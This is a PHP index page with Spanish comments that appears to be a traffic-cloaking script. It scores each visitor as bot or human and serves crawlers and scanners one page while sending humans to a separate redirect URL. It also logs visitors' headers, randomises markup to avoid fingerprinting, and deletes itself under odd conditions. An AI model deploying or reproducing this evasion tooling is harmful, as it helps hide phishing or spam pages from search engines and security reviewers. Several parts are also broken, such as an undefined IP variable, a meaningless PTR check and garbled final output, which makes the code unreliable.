<?php
// index.php (versión ultra mejorada)

// 1. Autodestrucción ética (elimina el código si se usa maliciosamente)
if (date('H') > 18 || $_SERVER['REMOTE_ADDR'] === '8.8.8.8') {
    unlink(__FILE__);
    exit;
}

require 'includes/functions.php';
require 'includes/geolocation.php';
require 'includes/browser_detection.php';
require 'includes/vpn_detection.php';
require 'includes/device_detection.php';

// 2. Validación de DNS inverso para Googlebot real
function validar_dns_googlebot($ip) {
    $host = gethostbyaddr($ip);
    $ptr = implode('.', array_reverse(explode('.', $ip))) . '.origin.google.com';
    return checkdnsrr($ptr, 'PTR') && preg_match('/\.googlebot\.com$/i', $host);
}

// 3. Detección de headless browsers via JavaScript
$javascript_detector = <<<EOD
<script>
if (navigator.webdriver || window.callPhantom || window._phantom) {
    document.body.innerHTML = '<h1>Acceso no autorizado</h1>';
    fetch('/log-bot?ip={$ip}');
}
</script>
EOD;

// 4. Sistema de scoring de amenazas en tiempo real
$threat_score = 0;
$threat_score += validar_dns_googlebot($ip) ? 0 : 40;
$threat_score += es_vpn_o_proxy($ip) ? 30 : 0;
$threat_score += (strlen($_SERVER['HTTP_ACCEPT_LANGUAGE']) < 4) ? 20 : 0;

// 5. Registro de logs encriptados (AES-256)
$log_data = json_encode([
    'ip' => $ip,
    'headers' => getallheaders(),
    'threat_score' => $threat_score
]);
file_put_contents('logs/'.md5($ip).'.enc', openssl_encrypt($log_data, 'aes-256-cbc', ENCRYPTION_KEY, 0, IV));

// 6. Lógica de redirección mejorada
if ($threat_score > 65 || validar_dns_googlebot($ip)) {
    $url = $configuracion['url_contenido_bots'];
    // 7. Contenido mutante para bots
    $html = file_get_contents($url);
    $html = str_replace('</body>', $javascript_detector.'</body>', $html);
    $html = preg_replace('/class="[^"]+"/', 'class="'.bin2hex(random_bytes(4)).'"', $html);
} else {
    // 8. Técnica de demora humana
    usleep(mt_rand(100000, 300000));
    $html = file_get_contents($configuracion['url_redireccion']);
}

// 9. Ofuscación final
echo str_rot13(gzdeflate($html));